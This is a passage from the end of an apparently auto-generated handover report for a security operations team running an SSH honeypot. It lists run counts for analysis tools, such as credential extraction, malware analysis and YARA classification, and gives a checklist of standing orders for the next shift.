| Tool 26  | Incident Timeline Generator | ✅ 329 cases |
| Tool 34  | Credential Extractor        | ✅ 299 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 132 priority case(s) shown individually · 22 recon entry/entries in table (10 group(s) consolidating 183 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-11T06:59:17Z_
